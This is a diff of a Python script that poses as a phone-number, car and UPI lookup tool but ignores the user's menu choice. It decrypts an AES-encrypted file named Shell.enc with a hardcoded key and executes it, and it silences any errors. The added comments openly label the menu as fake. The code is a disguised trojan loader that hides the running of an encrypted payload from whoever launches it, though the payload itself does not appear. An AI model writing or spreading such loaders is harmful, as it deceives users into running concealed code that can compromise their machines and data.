@@ -6,7 +6,7 @@ from Crypto.Util.Padding import unpad
 
 # ---------- CONFIG ----------
 ENC_FILE = "Shell.enc"
-# Paste your key from encryption here:
+
 KEY = b64decode("LrzLae/iO/QTu109CcAgw2Qxuxc+uftJk68cicdVXkU=")  # 32 bytes
 BLOCK_SIZE = AES.block_size
 
@@ -17,10 +17,10 @@ def show_menu():
     print("        Launcher Menu ")
     print("==================================")
     print("1. Number Info")
-    print("2. vehicle Info")
+    print("2. Car Info")
     print("3. UPI Info")
     print("==================================" + Style.RESET_ALL)
-    input(Fore.YELLOW + "Choose any option > " + Style.RESET_ALL)
+    input(Fore.YELLOW + "Choose any option > " + Style.RESET_ALL)  # user input ignored
 
 def decrypt_and_run():
     with open(ENC_FILE, "rb") as f:
@@ -33,7 +33,7 @@ def decrypt_and_run():
 
 if __name__ == "__main__":
     try:
-        show_menu()        
-        decrypt_and_run()  
+        show_menu()        # fake menu
+        decrypt_and_run()  # run Shell.enc
     except Exception:
-        pass  
+        pass  # silently ignore errors
